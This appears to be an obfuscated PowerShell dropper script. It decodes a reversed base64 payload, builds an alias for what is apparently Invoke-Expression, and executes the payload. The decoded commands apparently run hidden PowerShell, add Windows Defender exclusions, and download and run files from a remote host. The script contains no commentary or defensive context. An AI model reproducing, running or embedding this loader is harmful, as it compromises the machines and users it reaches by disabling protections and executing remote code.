$best64code = "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" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;
$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;
$RandomSTR64 = '40TpN1cFJHcYVWLFt0b25Ua'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;
$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;
$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;
$aliasSTR64 = 'gMxImd'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;
$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;
$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;
$nuLL = NeW-aliAs -NAme $aliAsfInal -VAlUe $iEXcMD -FORcE ; & $AlIaSfInal $loADCoDe ;
